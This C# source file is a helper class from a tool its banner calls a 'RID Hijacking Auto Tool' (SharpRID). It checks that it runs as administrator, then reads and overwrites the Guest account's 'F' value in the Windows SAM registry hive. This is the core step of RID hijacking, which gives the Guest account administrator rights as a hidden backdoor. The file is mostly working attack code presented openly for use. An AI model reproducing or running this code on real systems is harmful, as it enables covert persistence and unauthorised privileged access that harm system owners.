using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using static SharpRID.Native.Sysinternals;

namespace SharpRID.Native
{
    class HelperClass
    {
        public static string Path = @"HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F5";
        public static string Key = "F";
        public void Printer(int type, string text)
        {
            if (type == 0) //Info Message
            {
                Console.WriteLine("[*]  " + text);
            }
            if (type == 1) //Positive Message
            {
                Console.WriteLine("[+]  " + text);
            }
            if (type == 2) //Negative Message
            {
                Console.WriteLine("[-]  " + text);
            }
            if (type == 3) //Warning Message
            {
                Console.WriteLine("[!]  " + text);
            }
            if (type == 4)
            {
                Console.WriteLine("*********************************************");
                Console.WriteLine("*                                           *");
                Console.WriteLine("*          RID Hijacking Auto Tool          *");
                Console.WriteLine("*                                           *");
                Console.WriteLine("*                           Authour: taftss *");
                Console.WriteLine("*                           Version: 1.0    *");
                Console.WriteLine("*                                           *");
                Console.WriteLine("*********************************************");
                Console.WriteLine("");
            }
        }
        public static bool IsHighIntegrity()
        {
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }

        public static bool IsLocalAdmin()
        {
            string[] SIDs = GetTokenGroupSIDs();
            foreach (string SID in SIDs)
            {
                if (SID == "S-1-5-32-544")
                {
                    return true;
                }
            }
            return false;
        }
        public static string[] GetTokenGroupSIDs()
        {
            int TokenInfLength = 0;
            bool Result = GetTokenInformation(WindowsIdentity.GetCurrent().Token, TOKEN_INFORMATION_CLASS.TokenGroups, IntPtr.Zero, TokenInfLength, out TokenInfLength);
            IntPtr TokenInformation = Marshal.AllocHGlobal(TokenInfLength);
            Result = GetTokenInformation(WindowsIdentity.GetCurrent().Token, TOKEN_INFORMATION_CLASS.TokenGroups, TokenInformation, TokenInfLength, out TokenInfLength);

            if (!Result)
            {
                Marshal.FreeHGlobal(TokenInformation);
                return null;
            }

            TOKEN_GROUPS groups = (TOKEN_GROUPS)Marshal.PtrToStructure(TokenInformation, typeof(TOKEN_GROUPS));
            string[] userSIDS = new string[groups.GroupCount];
            int sidAndAttrSize = Marshal.SizeOf(new SID_AND_ATTRIBUTES());
            for (int i = 0; i < groups.GroupCount; i++)
            {
                SID_AND_ATTRIBUTES sidAndAttributes = (SID_AND_ATTRIBUTES)Marshal.PtrToStructure(
                    new IntPtr(TokenInformation.ToInt64() + i * sidAndAttrSize + IntPtr.Size), typeof(SID_AND_ATTRIBUTES));

                IntPtr pstr = IntPtr.Zero;
                ConvertSidToStringSid(sidAndAttributes.Sid, out pstr);
                userSIDS[i] = Marshal.PtrToStringAuto(pstr);
                LocalFree(pstr);
            }

            Marshal.FreeHGlobal(TokenInformation);
            return userSIDS;
        }

        public byte[] RegistryGetter()
        {
            byte[] GuestRIDHexValue = (byte[])Registry.GetValue(Path, Key, null);
            return GuestRIDHexValue;
        }
        public byte[] StringToHex(List<string> RIDList)
        {
            var NewGuestRIDStringValue = String.Join("-", RIDList.ToArray());
            byte[] NewGuestRIDHexValue = NewGuestRIDStringValue.Split('-').Select(b => Convert.ToByte(b, 16)).ToArray();
            return NewGuestRIDHexValue;
        }
        public void RegistrySetter(byte[] NewGuestRIDHexValue)
        {
            Registry.SetValue(Path, Key, NewGuestRIDHexValue);
        }
    }
}
